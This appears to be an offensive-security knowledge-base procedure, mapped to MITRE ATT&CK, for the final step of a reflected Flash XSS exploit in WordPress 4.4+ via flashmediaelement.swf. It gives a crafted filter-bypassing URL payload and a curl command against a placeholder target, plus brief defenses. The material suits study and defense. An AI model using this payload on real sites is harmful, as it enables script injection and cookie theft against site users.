---
id: proc-uuid-5
tags:
  - xss
  - poc
  - execution
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-flash-xss-poc]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:55.622Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Execute Flash XSS PoC in WordPress

## Summary

This procedure triggers the reflected Flash XSS by requesting a specially crafted URL to the SWF file, combining all bypasses to execute arbitrary JavaScript in the site's origin, demonstrating impacts like alerts or session access.

## Description

Final exploitation step: Load SWF with bypassed params (invalid escapes for scrubbing, backticks for blacklist, direct access for objectID). ExternalInterface.call executes the payload. Affects WordPress 4.4+ with MediaElement. Prerequisites: All prior bypasses validated. Outcome: JS runs, e.g., alert(1), evading XSS filters via Flash vector. Impacts: Cookie theft, defacement.

## Requirements

1. Vulnerable WordPress site
2. Crafted URL from previous steps
3. Browser or curl for request

## Defense

Defensive measures and detection strategies:

- Patch WordPress (fixed post-2016)
- Use [[commands/block-swf-direct-access]] in .htaccess
- WAF rules for SWF param anomalies

## Objectives

1. Achieve arbitrary JS execution
2. Validate full chain success
3. Demonstrate real-world impact

## Instructions

### Step 1: Construct PoC URL

**Context**: Encode full payload.

URL: https://target.com/wp-includes/js/mediaelement/flashmediaelement.swf?%#jsinitfunctio%gn=alert`1`
(Encoded: ?%25#jsinitfunctio%25gn=alert%601%60)

**Expected Output**: Valid requestable URL.

### Step 2: Request and Execute

**Context**: Trigger the exploit.

Execute [[commands/curl-flash-xss-poc]]:

```bash
curl "https://target.com/wp-includes/js/mediaelement/flashmediaelement.swf?%25#jsinitfunctio%25gn=alert%601%60" -v
```

> In browser, loads SWF and pops alert; curl shows HTTP response, but execution needs render.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-flash-xss-poc]]

## Tools Used


## Tags

- [[xss]]
- [[poc]]
